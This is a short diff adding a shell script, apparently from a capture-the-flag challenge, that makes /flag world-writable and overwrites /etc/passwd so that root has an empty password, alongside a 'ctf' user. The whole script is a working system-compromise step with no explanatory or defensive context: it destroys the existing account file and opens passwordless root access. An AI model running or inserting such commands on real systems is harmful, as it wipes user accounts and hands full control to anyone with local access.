@@ -1,0 +1,5 @@
+#!/bin/sh
+chmod 777 /flag && cat > /etc/passwd << EOF
+root::0:0:root:/root:/bin/sh
+ctf:x:1000:1000:chal:/home/ctf:/bin/sh
+EOF
